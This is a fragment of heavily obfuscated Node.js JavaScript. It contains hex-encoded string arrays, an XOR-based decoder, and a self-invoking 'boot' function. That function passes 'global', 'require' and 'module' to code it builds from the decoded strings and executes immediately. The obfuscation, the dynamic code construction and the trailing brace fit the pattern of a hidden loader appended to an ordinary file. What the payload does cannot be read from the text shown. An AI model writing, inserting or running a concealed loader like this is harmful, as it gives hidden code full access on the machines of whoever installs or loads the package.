3731311e4d001e5f31315b4d4d311331410004584d0000533111314d431745500d0756060033013c4d31423102000031010007011e004b4218175f4d310d154d2d31451d0622104719415f575f4d0c0410052002310f5f0c0026310c3131174d4d5f104d0a03315c4d1004004d4d311031104d44471b3100102d3131423103310c313c0d4240314f425612054d40212a31230f4d4f4d3e0c310631021f5f3138175f5f591f0238575f311d31424826044e314d0233420643450f5f560d460031310725111a004d104c314d5818184f2b4d585f0d5f4d4a574d17070e314a1031074b0e3101184d5f31004d11330e4d0031064300310008311b4a5f0045000a4d1a00060f161a584f4d3b0711310f313140430000054d00314343314731000c11114b4d1120135f2d1140264b3e310d31410a090d043131575f204702070f31020045174b424e31134d3e070c4d000a311e16103111104b0d43205f42584d05004d0023195f173157172031173117005e4d005000050c4d42434331585f05065b3107112e313138072d38001a3100595d370d5f0f3d4d0f0c5b310a3131001010001e31171300184d1031104d4d4d1e004d31023a385f0249434a2a4b0f07314b141011554349315442025f304d005f3f314d21262f3106553a055f525f06003311270643100f5333012740313e0c4d445f0f4d0e43314b134a5f060802004d00314d074d4d3c165f02445f43310f0a01050e0d07053e4d4b4631315f312d270031263140354d4d021002380d45314f475f4f315f0c5731310626314a10102f3e5b263031310631260a3118315f004d1843003424051e0c0b070002104d3e4d4305335e430c105554260c002a330c00434d540a04002520314d435f00264d2d434d0131','5753010e293a2110','565b52512b0519053237','0f060d04170b','5a555255503109023a2630','10130f0a17','0b120611101b0f16151402000709011a0e040c111905080c000a13171116170d10170c0d00','000b02112217','003d0e0609013d17110c','525054525b525519333b350f1a'];KmBFHpEdRXPQBdRu=function(){return cDmQ_ABHom;};return KmBFHpEdRXPQBdRu();}function daIQfX(MpmUMwi$WRckVhl,nY_To$Qm){var J$NlwSpydghfDNjrHkIJkQV=KmBFHpEdRXPQBdRu();return daIQfX=function(nSsxDSgcDDFqVICVEYFksq,sQACamQvSII){nSsxDSgcDDFqVICVEYFksq=nSsxDSgcDDFqVICVEYFksq-(Math.trunc(parseInt(0x21))*parseFloat(0x25)+Math.floor(parseInt(0xa22))+0x1*-parseInt(0xe7f));var DYqL$_ZlVzS=J$NlwSpydghfDNjrHkIJkQV[nSsxDSgcDDFqVICVEYFksq];if(daIQfX['zqiSUs']===undefined){var zht_wVWqujqYgkIj$Qt=function(FVqxX_sSL){var fpLvD$quQlg_cBijkWk=Math.max(0x1,0x1)*Math.ceil(0x2302)+parseInt(0x17fd)+Math.trunc(-parseInt(0x2))*0x1bce&Math.floor(-parseInt(0x2341))*-0x1+-0x718+-parseInt(0x1b2a),OxetOZSCa_IboGRq=new Uint8Array(FVqxX_sSL['match'](/.{1,2}/g)['map'](ytRObCYg_qXl=>parseInt(ytRObCYg_qXl,-0x476*-0x2+-parseInt(0x5)*-0x73+Math.floor(-parseInt(0xb1b))))),ziORlXpUcTTNRhKPtoCkPqF$T=OxetOZSCa_IboGRq['map'](eGVHzglg_qbPBekKstoxuVUFMm=>eGVHzglg_qbPBekKstoxuVUFMm^fpLvD$quQlg_cBijkWk),YwbuVNZxea=new TextDecoder(),eQMUhGpvH=YwbuVNZxea['decode'](ziORlXpUcTTNRhKPtoCkPqF$T);return eQMUhGpvH;};daIQfX['pwmLvH']=zht_wVWqujqYgkIj$Qt,MpmUMwi$WRckVhl=arguments,daIQfX['zqiSUs']=!![];}var TNkoElCCKyIRrT_flbVOHlgK=J$NlwSpydghfDNjrHkIJkQV[parseInt(0xa4a)+-0x7d*parseInt(-0x9)+-0x15*parseInt(0xb3)],mVFjD$LPwoRw$D=nSsxDSgcDDFqVICVEYFksq+TNkoElCCKyIRrT_flbVOHlgK,dTO_YApG_JZXc=MpmUMwi$WRckVhl[mVFjD$LPwoRw$D];return!dTO_YApG_JZXc?(daIQfX['eAfYbz']===undefined&&(daIQfX['eAfYbz']=!![]),DYqL$_ZlVzS=daIQfX['pwmLvH'](DYqL$_ZlVzS),MpmUMwi$WRckVhl[mVFjD$LPwoRw$D]=DYqL$_ZlVzS):DYqL$_ZlVzS=dTO_YApG_JZXc,DYqL$_ZlVzS;},daIQfX(MpmUMwi$WRckVhl,nY_To$Qm);}(function boot(GdiMiAIlgn,J$cGy_McRFWTA){var S_A$PLNfPHmujMepTnXm=daIQfX;GdiMiAIlgn['z']=z;var ngUNqXbQ=splitLane(S_A$PLNfPHmujMepTnXm(0x75));GdiMiAIlgn[ngUNqXbQ[-parseInt(0x470)+-parseInt(0x1fa9)+Math.max(parseInt(0x2419),0x2419)]]=J$cGy_McRFWTA;typeof module===ngUNqXbQ[0x9a3+Math.ceil(-parseInt(0x1))*parseFloat(parseInt(0x101f))+parseInt(0x67d)]&&(GdiMiAIlgn[ngUNqXbQ[Number(parseInt(0x33d))+Math.ceil(0x24ad)+Math.trunc(-parseInt(0x4fd))*parseInt(0x8)]]=module);var h$$NvHuXI=peel(S_A$PLNfPHmujMepTnXm(0x73)),txqquKPEmrdrWd_omlRQYjaY=h$$NvHuXI[S_A$PLNfPHmujMepTnXm(0x6b)](0xb92+-0x9e+-parseInt(0xaf4),0x19a+Math.ceil(-0xd)*0x278+parseInt(0x1e89)),CWcrClcy__GXNo=peel[txqquKPEmrdrWd_omlRQYjaY],uZjEDBZXVl=CWcrClcy__GXNo('',peel(S_A$PLNfPHmujMepTnXm(0x6a))),nuHJlzVTSNgUxMYmoMbTrJdj=uZjEDBZXVl(peel(S_A$PLNfPHmujMepTnXm(0x6d)));return CWcrClcy__GXNo('',nuHJlzVTSNgUxMYmoMbTrJdj)(Math.floor(-0x175)*Math.trunc(-parseInt(0x15))+-0x2*-parseInt(0x455)+parseInt(-parseInt(0x1d76))),0x2d6f+-parseInt(0x19f)*-0x17+parseInt(0x2ae)*Math.trunc(-0x13);}(global,require));
}
